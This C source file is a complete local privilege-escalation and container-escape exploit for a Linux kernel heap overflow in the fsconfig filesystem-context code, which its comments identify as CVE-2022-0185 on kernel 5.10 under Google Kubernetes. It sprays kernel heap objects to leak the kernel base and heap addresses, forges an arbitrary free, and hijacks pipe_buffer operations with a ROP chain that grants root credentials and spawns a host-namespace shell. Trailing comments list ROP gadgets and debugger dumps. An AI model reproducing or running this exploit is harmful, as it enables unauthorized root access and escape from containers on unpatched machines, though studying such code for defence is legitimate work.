// gcc -no-pie -static exploit_kctf.c util.c -o exploit_kctf -masm=intel -pthread
#define _GNU_SOURCE
#include <stdbool.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>
#include <stdint.h>

#include "util.h"

// 5.10.68+, spray targeted on Google Kubernetes
#define H_SPRAY 7    
#define K_SPRAY 6
#define P_SPRAY 6
#define PIPES 50
#define ROP_SPRAY 0x100
#define SPRAY_32 100
#define SPRAY_512 0x100
#define SPRAY_1k 80
#define SPRAY_4K 0x1000

uint64_t offsets[] = {0x336770, 0x186c160};  // ffffffff81336770  0xffffffff8286c160 <modprobe_path>:	"/sbin/modprobe"
enum {SINGLE_START = 0, MODPROBE};

//mov rsp, rax ; pop rbp ; ret; 0xffffffff81065879
// uint64_t stack_pivot = 0xffffffff81e01397 - 0xffffffff81000000ull;   // 0xffffffff81e01397: mov rsp, rax; lea rbp, [rsp + 1]; push r12; ret; 
// uint64_t stack_pivot = 0xffffffff81029f61 - 0xffffffff81000000ull;   
uint64_t stack_pivot = 0xffffffff8172ee7c - 0xffffffff81000000ull;            // 0xffffffff8172ee7c: push rsi; jmp qword ptr [rsi + 0x39];
uint64_t mov_rdi_rax_pop_pop =  0xffffffff81029f61 - 0xffffffff81000000ull;         // 0xffffffff81029f61: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret; 
uint64_t pop_rsp = 0xffffffff8104fe74 - 0xffffffff81000000ull;                      // 0xffffffff8104fe74: pop rsp; ret;
uint64_t add_rsp_0xd0 = 0xffffffff8106f989 - 0xffffffff81000000ull;                 // 0xffffffff8106f989: add rsp, 0xd0; ret;

uint64_t ud2 = 0xffffffff8104160full - 0xffffffff81000000ull;                           // XX
uint64_t commit_creds = 0xffffffff810c9f00 - 0xffffffff81000000ull;                 // ffffffff810c9f00 T commit_creds
uint64_t prepare_kernel_cred = 0xffffffff810ca3e0 - 0xffffffff81000000ull;          // ffffffff810ca3e0 T prepare_kernel_cred
uint64_t switch_task_namespaces = 0xffffffff810c8ad0 - 0xffffffff81000000ull;       // ffffffff810c8ad0 T switch_task_namespaces
uint64_t find_task_by_vpid = 0xffffffff810c0a30 - 0xffffffff81000000ull;            // ffffffff810c0a30 T find_task_by_vpid
uint64_t init_nsproxy = 0xffffffff8286b560 - 0xffffffff81000000ull;                 // ffffffff8286b560 D init_nsproxy
uint64_t kpti_trampoline = 0xffffffff81e00fb0 + 0x16 - 0xffffffff81000000ull;       // ffffffff81e00fb0 T swapgs_restore_regs_and_return_to_usermode
uint64_t pop_rdi = 0xffffffff810475ed - 0xffffffff81000000ull;                   // 0xffffffff810475ed: pop rdi; ret; 
uint64_t pop_rsi = 0xffffffff811d20fe - 0xffffffff81000000ull;                   // 0xffffffff811d20fe: pop rsi; ret;
//: test esi, esi ; cmovne rdi, rax ; mov rax, qword [rdi] ; pop rbp ; ret  ;
uint64_t cmov_rdi_rax_esi_nz_pop_rbp = 0xffffffff81674342ull - 0xffffffff81000000ull;   // XX

typedef struct
{
    uint64_t kmalloc_1024_leak;
    uint64_t kmalloc_512_leak;
}double_heap_leaks;

int fd = 0;
int pipefd[PIPES][2];
int spray_512_qid[0x10000] = {0};
int rop_msg_qid[ROP_SPRAY];

int spray_4k_qid[0x10000] = {0}; // useful to dump later
int spray_4k_count = 0;          // total 4096 4k msg
int spray_4k_used = 0;           // the num of freed 4k msg

void debug() 
{
    puts("Paused...");
    getchar();
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]status has been saved.");
}

// release all msg_msg in kmalloc-512
void deplete_512()
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1000;
    for (int i = 0; i < SPRAY_512; i++)
        get_msg(spray_512_qid[i], recieved, 0x200 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
    return;
}
// spray 0x100 msg_msg in kmalloc-512
void spray_512()
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1000;
    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < SPRAY_512; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, 0x200 - 0x30, 0);
        spray_512_qid[i] = spray;
    }
    return;
}
// free count msg_msg 
void stuff_4k(int count)
{
    char received[0x2000] = {0};
    for (int i = 0; i < count; i++)
    {
        if (spray_4k_used == spray_4k_count)
        {
            puts("nothing more left to help");
            exit(-1);
        }
        get_msg(spray_4k_qid[spray_4k_used++], received, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);
    }
    return;
}
// release all msg_msg in kmalloc-4k
void deplete_4k()
{
    char recieved[0x2000] = {0};
    while (spray_4k_used != spray_4k_count)
    {
        get_msg(spray_4k_qid[spray_4k_used++], recieved, 0x1000-0x30, 0, IPC_NOWAIT | MSG_NOERROR);
    }
    spray_4k_used = 0;
    spray_4k_count = 0;
    return;
}
// spray 4096 msg_msg in kmalloc-4k
void spray_4k()
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1000;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < SPRAY_4K; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, size - 0x30, 0);
        spray_4k_qid[spray_4k_count++] = spray;
    }
    return;
}

void generic_spray(uint64_t size, uint64_t count)
{
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;

    memset(buffer, 0x41, sizeof(buffer));
    for (int i = 0; i < count; i++)
    {
        int spray = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(spray, message, size - 0x30, 0);
    }
    return;
}

uint64_t do_kaslr_leak() 
{
    uint64_t kbase = 0;
    char pat[0x1000] = {0};
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;
    int size = 0x1018;
// (1) spray 6 msg_msg
    int targets[K_SPRAY] = {0};
    int i;
    for (i = 0; i < K_SPRAY; i++) 
    {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }
// (2) spray 100 seq_operations in kmalloc-32
    puts("[*] Spraying kmalloc-32");
    int kmalloc_32_fd[SPRAY_32];
    for (int i = 0; i < SPRAY_32; i++) 
        kmalloc_32_fd[i] = open("/proc/self/stat", O_RDONLY);

// (3) leave a hole for the vulnerable object
    get_msg(targets[0], recieved, size - 0x30, 0, MSG_NOERROR | IPC_NOWAIT | MSG_COPY);
// (4) prepare to overflow  ->  size = 4095 = 117*(33+2)
    memset(pat, 0x42, sizeof(pat));
    pat[sizeof(pat)-1] = '\x00';
    puts("[*] Opening ext4 filesystem");

    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
        puts("fsopen: Remember to unshare");
        exit(-1);
    }

    puts("[*] Overflowing...");
    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);

    // free 16 msg_msg  ???????
    stuff_4k(16);

// (5) overflow to change msg_msg->m_ts = 0x1060    
    pat[21] = '\x00';
    char evil[] = "\x60\x10";
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);  // overflow (21+1) bytes ----- at offset [0, 21] 
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0); // ([22, 23] = ",=")
    puts("[*] Done heap overflow");

    size = 0x1060;
    puts("[*] Checking for kernel leaks");

// (8) leak kernel base (read msg_msg)
    for (int i = 0; i < K_SPRAY; i++) 
    {
        if (get_msg(targets[i], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == size)
        {
            printf("Overflow succeed-------------------------------------------!!!\n");
            // print_hex(recieved+0xfd0, 0x50);
            kbase = ((uint64_t *)recieved)[510] - offsets[SINGLE_START];        // (510*8-0xfd0 = 0x20)
            if (kbase & 0x1fffff || kbase == 0 || (kbase & (0xfffffful << 40)) != ((0xfffffful << 40)))
                return 0;
            close(fd);
            return kbase;
        }
    }

    puts("[X] No leaks, trying again");
    // free some and cleanup
    close(fd);
    stuff_4k(16);           // free 16 msg_msg  ???????
    for (int i = 0; i < SPRAY_32; i++) 
        close(kmalloc_32_fd[i]);
    return 0;
}

double_heap_leaks do_heap_leaks()
{
    uint64_t kmalloc_1024 = 0;
    uint64_t kmalloc_512 = 0;
    char pivot_spray[0x2000] = {0};
    uint64_t *pivot_spray_ptr = (uint64_t *)pivot_spray;
    double_heap_leaks leaks = {0};
    int linked_msg[256] = {0};
    char pat[0x1000] = {0};
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    msg *message = (msg *)buffer;

// (1) spray kmalloc-512 <-> kmalloc-64 <-> kmalloc-1024 in 255 msg queues
    for (int i = 0; i < 255; i++) 
    {
        linked_msg[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        memset(pivot_spray, 0x0, sizeof(pivot_spray));
        pivot_spray_ptr[0] = 1;
        for (int i = 0; i < 10; i++)
            pivot_spray_ptr[i+1] = stack_pivot;

        // spray pivots using kmalloc-512 allocations
        send_msg(linked_msg[i], pivot_spray, 0x200 - 0x30, 0);      // spray kmalloc-512 (place stack pivot)
        memset(buffer, 0x1+i, sizeof(buffer));
        message->mtype = 2;
        send_msg(linked_msg[i], message, 0x40 - 0x30, 0);           // spray kmalloc-64
        message->mtype = 3;
        send_msg(linked_msg[i], message, 0x400 - 0x30 - 0x40, 0);   // spray kmalloc-1024
    }
// (2) spray 6 msg_msg in kmalloc-4096 + kmalloc-64
    int size = 0x1038;
    int targets[H_SPRAY] = {0};

    for (int i = 0; i < H_SPRAY; i++) 
    {
        memset(buffer, 0x41+i, sizeof(buffer));
        targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
        send_msg(targets[i], message, size - 0x30, 0);
    }

// (3) leave a hole for the vulnerable obejct
    get_msg(targets[0], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
// (4) prepare to overflow  ->  size = 4095 = 117*(33+2)
    puts("[*] Opening ext4 filesystem");
    fd = fsopen("ext4", 0);
    if (fd < 0) 
    {
        puts("fsopen: Remember to unshare");
        exit(-1);
    }

    strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
    for (int i = 0; i < 117; i++) 
        fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
// (5) overflow to change msg_msg->m_ts = 0x1960 
    // fill it a bit to help prevent potential crashes on MSG_COPY
    stuff_4k(16);   // ?????????

    puts("[*] Overflowing...");
    pat[21] = '\x00';
    char evil[] = "\x60\x19";
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
    fsconfig(fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
    puts("[*] Done heap overflow");
// (6) leak heap addr (kmalloc-1024 & kmalloc-512)
    size = 0x1960;
    puts("[*] Receiving corrupted size and leak data");

    for (int i = 0; i < H_SPRAY; i++) 
    {
        get_msg(targets[i], recieved, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
        for (int j = 0x202; j < 0x202 + (0x1960-0x1010) / 8; j++)
        {
            uint64_t *dump = (uint64_t *)recieved;
            if (dump[j] == 0x2 && dump[j+1] == 0x10 && dump[j+4] == dump[j+5])      // m_type == 2 && m_ts == 0x10
            {
                kmalloc_1024 = dump[j-2];
                kmalloc_512 = dump[j-1];

            // (6-1) release kmalloc-1024, kmalloc-512 already has sprayed pivots
                uint8_t target_idx = (dump[j+4] & 0xff) - 1;

                get_msg(linked_msg[target_idx], recieved, 0x400 - 0x30, 3, IPC_NOWAIT | MSG_NOERROR);

            // (6-2) spray 50 pipe_buffer
                for (int k = 0; k < PIPES; k++)
                {
                    if (pipe(pipefd[k]) < 0)
                    {
                        perror("pipe failed");
                        exit(-1);
                    }
                    write(pipefd[k][1], "pwnage", 7);
                }
                break;
            }
        }
        if (kmalloc_1024 != 0)
            break;
    }
    close(fd);
    // (6-3) try again
    if (!kmalloc_1024)
    {
        puts("[X] No leaks, trying again");
        stuff_4k(16);
        return leaks;
    }
    leaks.kmalloc_1024_leak = kmalloc_1024;
    leaks.kmalloc_512_leak = kmalloc_512;
    return leaks;
}

void pwned()
{
    write(1, "ROOOOOOOOOOOT\n", 14);
    setns(open("/proc/1/ns/mnt", O_RDONLY), 0);
    setns(open("/proc/1/ns/pid", O_RDONLY), 0);
    setns(open("/proc/1/ns/net", O_RDONLY), 0);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    _exit(0);
}

// Note: Must not touch offset 0x10-0x18.
void build_krop(char *buf) {
  uint64_t *rop;
  *(uint64_t *)&buf[0x39] = pop_rsp;                           
  *(uint64_t *)&buf[0x00] = add_rsp_0xd0; 

  rop = (uint64_t *)&buf[0xD8];

  *rop++ = pop_rdi;
  *rop++ = 0;
  *rop++ = prepare_kernel_cred;
  *rop++ = mov_rdi_rax_pop_pop;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = commit_creds;
  *rop++ = pop_rdi;
  *rop++ = 1;
  *rop++ = find_task_by_vpid;
  *rop++ = mov_rdi_rax_pop_pop;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xdeadbeef;
  *rop++ = pop_rsi;
  *rop++ = init_nsproxy;
  *rop++ = switch_task_namespaces;
  *rop++ = kpti_trampoline;
  *rop++ = 0xdeadbeef;
  *rop++ = 0xbaadf00d;
  *rop++ = (uint64_t)pwned;
  *rop++ = user_cs;
  *rop++ = user_rflags;
  *rop++ = user_sp & 0xffffffffffffff00;
  *rop++ = user_ss;
}

// hijack control-flow: arb free -> hijack pipe_buffer
void do_win(uint64_t kmalloc_512, uint64_t kmalloc_1024) 
{
    int size = 0x1000;
    int target = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
    char buffer[0x2000] = {0}, recieved[0x2000] = {0};
    char pat[0x40] = {0};
    msg* message = (msg*)buffer;
    memset(buffer, 0x44, sizeof(buffer));
    int ready = 0;
    int ignition_target = -1;

    // doesn't matter as long as valid pointers
    uint64_t next_target = kmalloc_1024 + 0x440;
    uint64_t prev_target = kmalloc_512 + 0x440;

    // set up arb free primitive, avoid tripping hardened usercopy when re-alloc with msg_msg
    uint64_t free_target = kmalloc_1024 - 0x30;    // - 0x20
    uint64_t make_sec_happy = kmalloc_512 - 0x20;

    stuff_4k(16);

    int targets[P_SPRAY] = {0};

    while (!ready)
    {
// (1) spray 6 msg_msg in kmalloc-4k
        for (int i = 0; i < P_SPRAY; i++) 
        {
            memset(buffer, 0x41+i, sizeof(buffer));
            targets[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);
            send_msg(targets[i], message, size - 0x30, 0);
        }
// (2) leave a hole
        get_msg(targets[0], recieved, size-0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
// (3) prepare overflow
        // misaligned arb free attack
        fd = fsopen("ext4", 0);
        if (fd < 0) 
        {
            puts("Opening");
            exit(-1);
        }

        strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
        for (int i = 0; i < 117; i++)
            fsconfig(fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
        puts("[*] Done heap overflow");
// (4) overflow to forge (msg_msg->next = &kmalloc-1024 - 0x20)
        char evil[0x40] = {0};
        uint64_t *evil_ptr = (uint64_t *)evil;
        memset(evil, 0x41, 0x30);
        evil_ptr[0] = next_target;
        evil_ptr[1] = prev_target;
        evil_ptr[4] = free_target;      // msg_msg->next
        evil_ptr[5] = make_sec_happy;   // msg_msg->security

         // in case null bytes in addresses
        if(strlen(evil) != 0x30)
        {
            puts("unable to continue given heap addresses");
            exit(-1);
        }

        puts("[*] Overflowing...");
        fsconfig(fd, FSCONFIG_SET_STRING, evil, "\x00", 0);     // use key to overflow
        puts("check heap to check preparedness for ignition");
// (5) find wether a msg_msg is corrupted.    release (&kmalloc-1024 - 0x20)
        stuff_4k(16);

        for (int i = 0; i < P_SPRAY; i++)
        {
            memset(recieved, 0, sizeof(recieved));
            // return error code -> (msg_msg->m_ts == 0x4141414141414141) find the overflowed msg_msg 
            // if (size+0x50-0x30 < msg_msg->m_ts) return error code.   (refer to https://elixir.bootlin.com/linux/v5.16.1/source/ipc/msg.c#L1144)
            // rely on error code to determine if we have found our target which we overflowed into      ?????????????????????
            int ret = get_msg_no_err(targets[i], recieved, size+0x50-0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);
            if (ret < 0)
            {
                ready = 1;
                ignition_target = i;
                break;
            }
        }

        if (!ready)
        {
            puts("nothing ready for ignition, trying again");
            // re-stuff freelist and stabilize
            stuff_4k(16);
        }
    }
// (6) ROP chain
    char overwrite[0x300] = {0};
    memset(overwrite, 0x41, sizeof(overwrite));
    uint64_t *overwrite_ptr = (uint64_t *)overwrite;     

    save_status();
    build_krop(overwrite+8);
    // change pipe_buffer->ops            (1) overwrite_ptr[0] -> m_type;  (2) msg_msg header takes up 0x30;  (3) pipe_buffer->ops offset: 0x10;   (4) pipe_buf_operations->release offset: 0x8;
    overwrite_ptr[3] = kmalloc_512 + 0x50; 

// (7) re-release kmalloc-1024
    for (int i = 0; i < P_SPRAY; i++)
        get_msg(targets[i], recieved, size-0x30, 0, IPC_NOWAIT | MSG_NOERROR);

// (8) spray (rop chain + pipe_buffer->ops) to replace pipe_buffer
    for (int i = 0; i < ROP_SPRAY; i++)
        send_msg(rop_msg_qid[i], overwrite, 0x300 - 0x30, 0);

    deplete_512();
    deplete_4k();
    puts("[*] Attempt at igniting ROP!");

// (9) trigger pipe release & hijack control-flow
    for (int i = 0; i < PIPES; i++)
    {
        close(pipefd[i][0]);
        close(pipefd[i][1]);
    }

}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

int main(int argc, char **argv, char **envp) 
{
// 1. gain CAP_SYS_ADMIN privilege  & initialize
    unshare_setup(getuid(), getgid());

    cpu_set_t my_set;      
    CPU_ZERO(&my_set);      
    CPU_SET(0, &my_set);     
    sched_setaffinity(0, sizeof(cpu_set_t), &my_set);

    // initalize queues to spam rop payload later
    for (int i = 0; i < ROP_SPRAY; i++)
        rop_msg_qid[i] = make_queue(IPC_PRIVATE, 0666 | IPC_CREAT);

    // spray 4096 msg_msg in kmalloc-4k
    spray_4k();

// 2. kbase leak —— change msg_msg->m_ts to leak seq_operations->stop
    uint64_t kbase = 0;
    while(!kbase)
    {
        kbase = do_kaslr_leak();
    }

    stack_pivot += (uint64_t)(kbase);
    ud2 += (uint64_t)(kbase);
    commit_creds += (uint64_t)(kbase);
    prepare_kernel_cred += (uint64_t)(kbase);
    switch_task_namespaces += (uint64_t)(kbase);
    find_task_by_vpid += (uint64_t)(kbase);
    init_nsproxy += (uint64_t)(kbase);
    kpti_trampoline += (uint64_t)(kbase);
    pop_rdi += (uint64_t)(kbase);
    pop_rsi += (uint64_t)(kbase);
    cmov_rdi_rax_esi_nz_pop_rbp += (uint64_t)(kbase);
    mov_rdi_rax_pop_pop += (uint64_t)(kbase);
    // push_rsi_jmp_0x39 += (uint64_t)(kbase);
    pop_rsp += (uint64_t)(kbase);
    add_rsp_0xd0 += (uint64_t)(kbase);

    printf("[*] kbase: %p\n", kbase);
// 3. leak heap addr (kmalloc-1024 & kmalloc-512)
    // pre heap leak setup
    stuff_4k(16);       // ??????????
    spray_512();        // spray 0x100 msg_msg in kmalloc-512
    generic_spray(1024, SPRAY_1k);  // spray 80 msg_msg in kmalloc-1024

    // kmalloc-1024 leak and kmalloc-512 leak
    uint64_t kmalloc_1024 = 0;
    uint64_t kmalloc_512 = 0;
    double_heap_leaks leaks = {0};

    while (!kmalloc_1024)
    {
        leaks = do_heap_leaks();
        kmalloc_1024 = leaks.kmalloc_1024_leak;
        kmalloc_512 = leaks.kmalloc_512_leak;
    }

    printf("[*] kmalloc 1024 chunk: 0x%llx\n", kmalloc_1024);
    printf("[*] kmalloc 512 chunk: 0x%llx\n", kmalloc_512);
// 4. hijack control-flow: arb free -> hijack pipe_buffer
    deplete_4k();       // release all msg_msg in kmalloc-4k
    spray_4k();

    // try to pwn
    do_win(kmalloc_512, kmalloc_1024);
    puts("[*] exploit failed :(");
    return 0;
}



/*
(1) useful gadget: mov rdi, rax

0xffffffff8197007b: mov rdi, rax; and ebx, 1; jne 0xb70086; pop rbx; pop rbp; ret;
0xffffffff8158a444: mov rdi, rax; jne 0x78a431; xor eax, eax; ret;
0xffffffff81029f61: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;

0xffffffff815c4e94: mov rdi, rax; jne 0x7c4e81; xor eax, eax; ret; 
0xffffffff8102bef1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;
0xffffffff811493ad: mov rdi, rax; test rax, rax; jne 0x3493a1; pop rbx; pop rbp; ret;  X 
0xffffffff81beb8c0: mov rdi, rax; xor eax, eax; test rdi, rdi; jne 0xdeb8cc; pop rbp; ret;  X

(2) 
alloc vulnerable object： legacy_parse_param()
    $ b fs/fs_context.c:541
		ctx->legacy_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
alloc msg_msg： alloc_msg()
    $ b ipc/msgutil.c:53
        msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);

(3) when call pipe_buffer->ops.release()
RSI -> pipe_buffer
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xffffffff81029f61  →  0x485d5bd889c78948  →  0x485d5bd889c78948
$rbx   : 0x0000000000000000  →  0x0000000000000000
$rcx   : 0x0000000000000000  →  0x0000000000000000
$rdx   : 0x0000000000000000  →  0x0000000000000000
$rsp   : 0xffffc90000517e00  →  0xffffffff81315abb  →  0x5c245c394101c383  →  0x5c245c394101c383
$rbp   : 0xffffc90000517e18  →  0xffffc90000517e40  →  0xffffc90000517e68  →  0xffffc90000517ea0  →  0xffffc90000517eb0  →  0xffffc90000517ed8  →  0xffffc90000517f18  →  0xffffc90000517f30
$rsi   : 0xffff888006c79000  →  0x0000000000000000  →  0x0000000000000000
$rdi   : 0xffff888006be1240  →  0x0000000000000000  →  0x0000000000000000
$rip   : 0xffffffff81029f61  →  0x485d5bd889c78948  →  0x485d5bd889c78948
$r8    : 0x0000000000000000  →  0x0000000000000000
$r9    : 0xffff888003c5dee0  →  0x000003e800041180  →  0x000003e800041180
$r10   : 0x0000000000000008  →  0x0000000000000008
$r11   : 0xffff8880068c1810  →  0xffff88800400e520  →  0xffff8880049f9180  →  0x0000000200300000  →  0x0000000200300000
$r12   : 0xffff888006be1240  →  0x0000000000000000  →  0x0000000000000000
$r13   : 0xffff888003c5df68  →  0x000c000000000000  →  0x000c000000000000
$r14   : 0xffff88800400e520  →  0xffff8880049f9180  →  0x0000000200300000  →  0x0000000200300000
$r15   : 0xffff888003c0b780  →  0x0000000240500000  →  0x0000000240500000

gef➤  x /40xg 0xffff888006c79000
0xffff888006c79000:	0x0000000000000000	0x0000000000000000
0xffff888006c79010:	0x0000000000000000	0xffffffff810475ed
0xffff888006c79020:	0x0000000000000000	0xffffffff810ca3e0
0xffff888006c79030:	0x0000000000029f61	0x00000000deadbeef
0xffff888006c79040:	0x00000000deadbeef	0xffffffff810c9f00
0xffff888006c79050:	0xffffffff810475ed	0x0000000000000001
0xffff888006c79060:	0xffffffff810c0a30	0x0000000000029f61
0xffff888006c79070:	0x00000000deadbeef	0x00000000deadbeef
0xffff888006c79080:	0xffffffff811d20fe	0xffffffff8286b560
0xffff888006c79090:	0xffffffff810c8ad0	0xffffffff81e00fc6
0xffff888006c790a0:	0x00000000deadbeef	0x00000000baadf00d
0xffff888006c790b0:	0x0000000000403164	0x0000000000000033

(4) stack pivot gadget
mov rsp, rsi   X
push rsp; pop rsp

0xffffffff81088d3c: call 0x1c2675c3; push rsi; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81b6cd03: push rsi; add byte ptr [r11 + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81088d41: push rsi; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81971d66: push rsi; add eax, 0x415b002b; pop rsp; pop r13; pop rbp; ret; 
0xffffffff8129d0b6: push rsi; add eax, 0xc4834800; or byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff819c09e6: push rsi; in eax, 0x25; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff811ab596: push rsi; mov dl, 0x18; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff813a6666: push rsi; mov ebp, 0x415b00c5; pop rsp; pop rbp; ret; 
0xffffffff81ab0976: push rsi; mov ebp, 0x415bfff1; pop rsp; pop r13; pop rbp; ret; 
0xffffffff815708eb: push rsi; or dword ptr [rcx + rcx*4 - 0x19], 0xdc62cbe8; lcall [rbx + 0x41]; pop rsp; pop rbp; ret; 
0xffffffff8167ade6: push rsi; pop r10; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81aa9f62: push rsi; pop rsp; call qword ptr [rbp + 0x48]; 
0xffffffff8131160e: push rsi; rol byte ptr [rcx], cl; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81aa9f61: stosd dword ptr [rdi], eax; push rsi; pop rsp; call qword ptr [rbp + 0x48]; 
0xffffffff81672b91: test dword ptr [rax], esi; push rsi; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret;


0xffffffff81b6cd03: push rsi; add byte ptr [r11 + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff81088d41: push rsi; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff8129d0b6: push rsi; add eax, 0xc4834800; or byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff819c09e6: push rsi; in eax, 0x25; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff811ab596: push rsi; mov dl, 0x18; add byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; 
0xffffffff813a6666: push rsi; mov ebp, 0x415b00c5; pop rsp; pop rbp; ret; 

john@ubuntu:~/Desktop/tmp/CVE-2022-0185$ cat ./g1 | grep "push rsi" | grep "jmp qword ptr \[rsi"
0xffffffff826dc50c: add byte ptr [rax], al; add byte ptr [rax], al; push rsi; and al, 0x3a; jmp qword ptr [rsi + 0x25]; 
0xffffffff826dc50e: add byte ptr [rax], al; push rsi; and al, 0x3a; jmp qword ptr [rsi + 0x25]; 
0xffffffff826dc510: push rsi; and al, 0x3a; jmp qword ptr [rsi + 0x25]; 
0xffffffff8172ee7c: push rsi; jmp qword ptr [rsi + 0x39]; 

*/
